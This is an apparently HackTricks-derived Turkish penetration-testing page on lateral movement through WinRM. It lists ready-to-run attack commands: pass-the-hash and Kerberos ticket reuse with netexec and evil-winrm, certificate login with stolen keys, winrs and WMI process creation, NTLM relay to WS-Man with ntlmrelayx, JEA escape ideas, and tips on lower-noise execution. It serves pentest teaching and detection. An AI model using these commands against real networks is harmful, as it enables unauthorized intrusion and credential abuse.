# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM, Windows ortamlarında en kullanışlı **lateral movement** taşıma yöntemlerinden biridir; SMB hizmeti oluşturma numaralarına gerek kalmadan **WS-Man/HTTP(S)** üzerinden uzak kabuk sağlar. Hedef **5985/5986** portlarını açığa çıkarıyorsa ve hesabınız remoting kullanabiliyorsa, çoğu zaman "geçerli kimlik bilgileri"nden "etkileşimli kabuk"a çok hızlı geçebilirsiniz.

**Protokol/hizmet numaralandırması**, listener'lar, WinRM'i etkinleştirme, `Invoke-Command` ve genel istemci kullanımı için şuraya bakın:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Operatörler WinRM'i neden tercih ediyor?

- **HTTP/HTTPS** kullanır; SMB/RPC kullanmadığı için PsExec tarzı çalıştırmanın engellendiği yerlerde genellikle çalışır.
- **Kerberos** ile hedefe yeniden kullanılabilir kimlik bilgileri gönderilmesini önler.
- **Windows**, **Linux** ve **Python** araçlarıyla (`winrs`, `evil-winrm`, `pypsrp`, `netexec`) sorunsuz çalışır.
- Etkileşimli PowerShell remoting yolu, hedefte kimliği doğrulanmış kullanıcı bağlamında **`wsmprovhost.exe`** işlemini başlatır; bu, hizmet tabanlı exec'ten operasyonel olarak farklıdır.

## Erişim modeli ve ön koşullar

Uygulamada, WinRM lateral movement işleminin başarılı olması **üç** şeye bağlıdır:

1. Hedefte bir **WinRM listener** (`5985`/`5986`) ve erişime izin veren güvenlik duvarı kuralları bulunmalıdır.
2. Hesap, endpoint'e **kimlik doğrulaması** yapabilmelidir.
3. Hesabın bir remoting oturumu **açma izni** olmalıdır.

Bu erişimi kazanmanın yaygın yolları:

- Hedefte **Local Administrator** olmak.
- Yeni sistemlerde **Remote Management Users** veya bu gruba hâlâ izin veren sistem/bileşenlerde **WinRMRemoteWMIUsers__** üyeliği.
- Yerel güvenlik tanımlayıcıları / PowerShell remoting ACL değişiklikleri aracılığıyla açıkça devredilmiş remoting hakları.

Yönetici haklarıyla bir makineyi zaten kontrol ediyorsanız, burada açıklanan teknikleri kullanarak tam yönetici grubu üyeliği olmadan da **WinRM erişimi devredebileceğinizi** unutmayın:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Lateral movement sırasında önemli kimlik doğrulama tuzakları

- **Kerberos için hostname/FQDN gerekir**. IP ile bağlanırsanız istemci genellikle **NTLM/Negotiate**'e geri döner.
- **Workgroup** veya trust sınırlarını aşan durumlarda NTLM genellikle **HTTPS** kullanılmasını ya da hedefin istemcide **TrustedHosts** listesine eklenmesini gerektirir.
- Workgroup ortamında Negotiate üzerinden **local account** kullanıldığında, yerleşik Administrator hesabı kullanılmadıkça veya `LocalAccountTokenFilterPolicy=1` ayarlanmadıkça UAC uzak erişim kısıtlamaları erişimi engelleyebilir.
- PowerShell remoting varsayılan olarak **`HTTP/<host>` SPN**'ini kullanır. **`HTTP/<host>`** zaten başka bir hizmet hesabına kayıtlıysa WinRM Kerberos `0x80090322` hatasıyla başarısız olabilir; port içeren bir SPN kullanın veya bu SPN'in bulunduğu **`WSMAN/<host>`**'e geçin.<sup>[[3]](#references)</sup>

Password spraying sırasında geçerli kimlik bilgileri elde ederseniz, bunların kabuk erişimi sağlayıp sağlamadığını kontrol etmenin en hızlı yolu genellikle WinRM üzerinden doğrulamaktır:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux'tan Windows'a lateral movement

### Doğrulama ve tek seferlik çalıştırma için NetExec / CrackMapExec

```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```

### Evil-WinRM for etkileşimli shell'ler

`evil-winrm`, **parolaları**, **NT hash'lerini**, **Kerberos ticket'larını**, **client certificate'larını**, dosya aktarımını ve PowerShell/.NET'i belleğe yüklemeyi desteklediğinden Linux'tan kullanılabilecek en kullanışlı etkileşimli seçenek olmaya devam ediyor.

```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```

### Kerberos SPN uç durumu: `HTTP` ve `WSMAN`

Varsayılan **`HTTP/<host>`** SPN Kerberos hatalarına neden olduğunda, bunun yerine **`WSMAN/<host>`** ticket'ı istemeyi/kullanmayı deneyin. Bu durum, **`HTTP/<host>`** zaten başka bir service account'a bağlı olduğunda, güvenliği sıkılaştırılmış veya sıra dışı kurumsal ortamlarda görülür.<sup>[[3]](#references)</sup>

```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```

Bu, genel bir `HTTP` ticket yerine özellikle bir **WSMAN** service ticket forge ettiğinizde veya talep ettiğinizde **RBCD / S4U** abuse sonrasında da kullanışlıdır.

### Certificate-based authentication

WinRM, **client certificate authentication** yöntemini de destekler; ancak sertifika hedefte bir **local account** ile eşlenmiş olmalıdır. Offensive açıdan bu, şu durumlarda önem taşır:

- WinRM için önceden eşlenmiş geçerli bir client certificate ve private key’i çaldıysanız/dışa aktardıysanız;
- Bir principal için sertifika edinmek amacıyla **AD CS / Pass-the-Certificate** abuse ettiyseniz ve ardından başka bir authentication path’e geçiş yaptıysanız;
- Bilerek password-based remoting kullanmayan ortamlarda çalışıyorsanız.

```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```

İstemci sertifikası kullanan WinRM, parola/hash/Kerberos kimlik doğrulamasına kıyasla çok daha az yaygındır; ancak kullanıldığında parola döndürme işleminden etkilenmeyen **parolasız lateral movement** yolu sağlayabilir.

### Python / `pypsrp` ile otomasyon

Operatör kabuğu yerine otomasyona ihtiyacınız varsa `pypsrp`, Python üzerinden NTLM, sertifika tabanlı kimlik doğrulama, Kerberos ve CredSSP desteğiyle WinRM/PSRP kullanmanızı sağlar.<sup>[[2]](#references)</sup>

```python
from pypsrp.client import Client

client = Client(
    "srv01.domain.local",
    username="DOMAIN\\user",
    password="Password123!",
    ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```


Üst düzey `Client` wrapper'ından daha ayrıntılı denetim gerekiyorsa, düşük düzeyli `WSMan` + `RunspacePool` API'leri operatörlerin sık karşılaştığı iki sorun için kullanışlıdır:

- birçok PowerShell istemcisinin varsayılan `HTTP` beklentisi yerine Kerberos service/SPN olarak **`WSMAN`** kullanmaya zorlamak;
- **`Microsoft.PowerShell`** yerine **JEA** / özel bir session configuration gibi varsayılan olmayan bir PSRP endpoint'ine bağlanmak.

```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
    "srv01.domain.local",
    auth="kerberos",
    ssl=False,
    negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
    ps.add_script("whoami; Get-Command")
    output = ps.invoke()
    print(output)
```

### Lateral movement sırasında özel PSRP uç noktaları ve JEA önemlidir

Başarılı bir WinRM kimlik doğrulaması, her zaman varsayılan ve kısıtlanmamış `Microsoft.PowerShell` uç noktasına eriştiğiniz anlamına **gelmez**. Olgun ortamlarda kendi ACL’lerine ve çalıştırma davranışlarına sahip **özel oturum yapılandırmaları** veya **JEA** uç noktaları bulunabilir.<sup>[[1]](#references)</sup>

Bir Windows host üzerinde zaten code execution elde ettiyseniz ve hangi uzaktan yönetim yüzeylerinin mevcut olduğunu anlamak istiyorsanız, kayıtlı uç noktaları listeleyin:

```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```

Kullanışlı bir endpoint varsa, varsayılan shell yerine doğrudan onu hedefleyin:

```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```

Pratik saldırı odaklı çıkarımlar:

- **Kısıtlı** bir endpoint, hizmet denetimi, dosya erişimi, işlem oluşturma veya keyfi .NET / harici komut yürütme için gereken cmdlet’leri/fonksiyonları sunuyorsa yanal hareket için yine de yeterli olabilir.
- **Yanlış yapılandırılmış bir JEA** role, özellikle `Start-Process` gibi tehlikeli komutları, geniş wildcard’ları, yazılabilir provider’ları veya amaçlanan kısıtlamalardan kaçmanıza olanak tanıyan özel proxy fonksiyonlarını açığa çıkarıyorsa çok değerlidir.
- **RunAs sanal hesapları** veya **gMSA’ler** tarafından desteklenen endpoint’ler, çalıştırdığınız komutların etkin güvenlik bağlamını değiştirir. Özellikle gMSA destekli bir endpoint, normal bir WinRM oturumunda klasik delegation sorunu yaşanacak olsa bile **ikinci hop’ta ağ kimliği** sağlayabilir.

Özel bir kısıtlı endpoint için etkin komut ve script izinlerini ayrı ayrı inceleyin: `Get-Command` çıktısındaki kısa bir liste, mevcut bir `.ps1` dosyasının çalıştırılamayacağını tek başına kanıtlamaz. [JEA rol yetenekleri](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities), hangi script yollarının çağrılabileceğini açıkça denetler; diğer özel endpoint’ler farklı oturum kuralları uygulayabilir. İzin verilen bir script, başka bir host için kimlik bilgisi oluştururken saklanan bir `SecureString` kullanıyorsa, açık bir anahtar belirtilmeden oluşturulan blob [Windows DPAPI](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) kullanır ve şifresini çözmek için genellikle koruyucu kullanıcı ile makine bağlamını gerektirir. Yazılabilir kaynak kodu veya kopyalanmış bir blob’u host’lar arası ayrıcalık yükseltme yolu olarak değerlendirmeden önce script’in ACL’sini, izin verilen çağrı biçimini, run-as kimliğini ve sonraki aşamalardaki kimlik bilgisi haklarını inceleyin. Pasif enumeration sırasında korunan değeri yazdırmayın.

Dosya yolu kabul eden özel bir JEA fonksiyonu için kayıtlı endpoint ACL’sini, eşlenen rol yeteneğini ve etkin run-as kimliğini birlikte inceleyin. Çağıran taraf `NoLanguage` kullanıyor olabilirken fonksiyonun gövdesi sistemin varsayılan dil modunda çalışabilir; ayrıca sanal bir hesap yerel yönetici haklarına sahip olabilir. Fonksiyon izin verilen bir dizini ham bir dize önekiyle denetliyor ve ardından verilen yolu okuyorsa `..` bileşenleri bu dizinin dışına çözümlebilir. Sınır, çağıranın dil modu veya görünen önek değil, fonksiyonun kimliği altında çözümlenen yoldur. Okunabilir bir `.psrc` veya `.pssc` dosyasını ayrıcalıklı dosya okuma bulgusu olarak değerlendirmeden önce erişilebilir fonksiyonu ve son yol doğrulamasını teyit edin. Microsoft’un [JEA rol yeteneği](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) ve [güvenlik hususları](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations) yönergelerine bakın.

## Windows'a özgü WinRM yanal hareketi

### `winrs.exe`

`winrs.exe`, etkileşimli bir PowerShell remoting oturumu açmadan **yerel WinRM komut yürütme** istediğinizde kullanışlıdır ve Windows'ta yerleşik olarak bulunur:

```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```

İki flag'i unutmak kolaydır ve pratikte önemlidir:

- Uzak principal **yerel yönetici** değilse genellikle `/noprofile` gerekir.
- `/allowdelegate`, uzak shell'in kimlik bilgilerinizi **üçüncü bir host** üzerinde kullanmasını sağlar (örneğin, komut `\\fileserver\share` gerektirdiğinde).

```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```

Operasyonel olarak, `winrs.exe` genellikle aşağıdakine benzer bir uzak işlem zinciri oluşturur:

```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```

Bunu hatırlamakta fayda var çünkü service-based exec'ten ve etkileşimli PSRP oturumlarından farklıdır.

### `winrm.cmd` / PowerShell remoting yerine WS-Man COM

`Enter-PSSession` kullanmadan, WS-Man üzerinden WMI sınıflarını çağırarak **WinRM transport** üzerinden de komut çalıştırabilirsiniz. Böylece transport WinRM olarak kalırken uzak yürütme primitive'i **WMI `Win32_Process.Create`** olur:

```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```

Bu yaklaşım şu durumlarda kullanışlıdır:

- PowerShell logging yoğun şekilde izleniyorsa.
- Klasik bir PS remoting iş akışı kullanmadan **WinRM transport** istiyorsanız.
- **`WSMan.Automation`** COM object etrafında özel araçlar geliştiriyor veya kullanıyorsanız.

## NTLM relay to WinRM (WS-Man)

SMB relay signing nedeniyle engellendiğinde ve LDAP relay kısıtlandığında, **WS-Man/WinRM** hâlâ cazip bir relay hedefi olabilir. Modern `ntlmrelayx.py`, **WinRM relay servers** içerir ve **`wsman://`** veya **`winrms://`** hedeflerine relay yapabilir.

```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```

İki pratik not:

- Relay, hedef **NTLM** kabul ettiğinde ve relay edilen principal WinRM kullanma iznine sahip olduğunda en kullanışlıdır.
- Güncel Impacket kodu, **`WSMANIDENTIFY: unauthenticated`** isteklerini özellikle ele alır; böylece `Test-WSMan` tarzı yoklamalar relay akışını bozmaz.

İlk WinRM oturumunu aldıktan sonraki multi-hop kısıtları için şuraya bakın:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC ve tespit notları

- **Interactive PowerShell remoting** genellikle hedefte **`wsmprovhost.exe`** oluşturur.
- **`winrs.exe`** genellikle **`winrshost.exe`** oluşturur ve ardından istenen alt süreci başlatır.
- Özel **JEA** endpoint'leri, eylemleri **`WinRM_VA_*`** sanal hesaplarıyla veya yapılandırılmış bir **gMSA** ile çalıştırabilir; bu durum, normal bir kullanıcı bağlamındaki shell'e kıyasla hem telemetriyi hem de ikinci atlama davranışını değiştirir.<sup>[[1]](#references)</sup>
- Ham `cmd.exe` yerine PSRP kullanırsanız ağ oturumu açma telemetrisini, WinRM service event'lerini ve PowerShell operational/script-block logging'i bekleyin.
- Yalnızca tek bir komut çalıştırmanız gerekiyorsa `winrs.exe` veya tek seferlik WinRM çalıştırma, uzun süreli bir interactive remoting oturumundan daha az dikkat çekebilir.
- Kerberos kullanılabiliyorsa hem trust sorunlarını hem de istemci tarafında `TrustedHosts` üzerinde değişiklik yapma gereksinimini azaltmak için IP + NTLM yerine **FQDN + Kerberos** tercih edin.

## References

- [1] [Microsoft: JEA Güvenlik Hususları](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [pypsrp README](https://github.com/jborean93/pypsrp)
- [3] [Microsoft: PowerShell'i WinRM aracılığıyla uzak bir sunucuya bağlarken oluşan `0x80090322` hatası](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)
{{#include ../../banners/hacktricks-training.md}}
